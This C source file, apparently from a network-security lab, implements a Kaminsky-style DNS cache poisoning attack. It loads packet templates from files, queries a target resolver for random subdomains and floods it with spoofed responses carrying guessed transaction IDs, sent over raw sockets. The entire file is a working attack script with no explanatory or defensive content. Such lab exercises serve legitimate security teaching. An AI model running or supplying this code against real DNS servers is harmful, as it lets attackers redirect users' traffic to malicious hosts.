#include <stdlib.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <time.h>

#define MAX_FILE_SIZE 1000000

/* IP Header */
struct ipheader {
    unsigned char iph_ihl:4; // IP header length
    unsigned char iph_ver:4; // IP version
    unsigned char iph_tos;   // Type of service
    unsigned short int iph_len; // IP Packet length (data + header)
    unsigned short int iph_ident; // Identification
    unsigned short int iph_flag:3; // Fragmentation flags
    unsigned short int iph_offset:13; // Flags offset
    unsigned char iph_ttl;  // Time to Live
    unsigned char iph_protocol; // Protocol type
    unsigned short int iph_chksum; // IP datagram checksum
    struct in_addr iph_sourceip; // Source IP address
    struct in_addr iph_destip; // Destination IP address
};

void send_raw_packet(char *buffer, int pkt_size);
void send_dns_request(unsigned char *ip_req, int n_req,
                      unsigned char *dst_ip, char *name,
                      unsigned short transaction_id);
void send_dns_response(unsigned char *ip_resp, int n_resp,
                       unsigned char *src_ip, char *name,
                       unsigned short transaction_id);

int main() {
    srand(time(NULL));

    // Load the DNS request packet from file
    FILE *f_req = fopen("ip_req.bin", "rb");
    if (!f_req) {
        perror("Can't open 'ip_req.bin'");
        exit(1);
    }
    unsigned char ip_req[MAX_FILE_SIZE];
    int n_req = fread(ip_req, 1, MAX_FILE_SIZE, f_req);

    // Load the first DNS response packet from file
    FILE *f_resp = fopen("ip_resp.bin", "rb");
    if (!f_resp) {
        perror("Can't open 'ip_resp.bin'");
        exit(1);
    }
    unsigned char ip_resp[MAX_FILE_SIZE];
    int n_resp = fread(ip_resp, 1, MAX_FILE_SIZE, f_resp);

    char a[26] = "abcdefghijklmnopqrstuvwxyz";
    int count = 0;
    while (count < 10000) {
        // Generate a random name with length 5
        char name[6];
        name[5] = '\0';
        for (int k = 0; k < 5; k++) name[k] = a[rand() % 26];

        /////////////////////////////////////////////
        // Step 1: Send a DNS request to the targeted local DNS server.
        // This will trigger the DNS server to send out DNS queries
        send_dns_request(ip_req, n_req, "10.9.0.53", name, count);

        // Step 2: Send many spoofed responses to the targeted local DNS server,
        //         each one with a different transaction ID.
        for (int i = 0; i < 100; i++) {
            send_dns_response(ip_resp, n_resp, "199.43.133.53", name, i);
        }
        count++;
    }
}

void send_dns_request(unsigned char *ip_req, int n_req,
                      unsigned char *dst_ip, char *name,
                      unsigned short transaction_id) {
    int ip = (int)inet_addr((char *)dst_ip);
    memcpy(ip_req + 16, (void *)&ip, 4);
    memcpy(ip_req + 41, name, 5);
    unsigned short id[2];
    *id = htons(transaction_id);
    memcpy(ip_req + 28, (void *)id, 2);
    send_raw_packet((char *)ip_req, n_req);
}

void send_dns_response(unsigned char *ip_resp, int n_resp,
                       unsigned char *src_ip, char *name,
                       unsigned short transaction_id) {
    int ip = (int)inet_addr((char *)src_ip);
    memcpy(ip_resp + 12, (void *)&ip, 4);
    memcpy(ip_resp + 41, name, 5);
    memcpy(ip_resp + 64, name, 5);
    unsigned short id[2];
    *id = htons(transaction_id);
    memcpy(ip_resp + 28, (void *)id, 2);
    send_raw_packet((char *)ip_resp, n_resp);
}

void send_raw_packet(char *buffer, int pkt_size) {
    struct sockaddr_in dest_info;
    int enable = 1;

    // Step 1: Create a raw network socket.
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

    // Step 2: Set socket option.
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));

    // Step 3: Provide needed information about destination.
    struct ipheader *ip = (struct ipheader *)buffer;
    dest_info.sin_family = AF_INET;
    dest_info.sin_addr = ip->iph_destip;

    // Step 4: Send the packet out.
    sendto(sock, buffer, pkt_size, 0, (struct sockaddr *)&dest_info, sizeof(dest_info));
    close(sock);
}

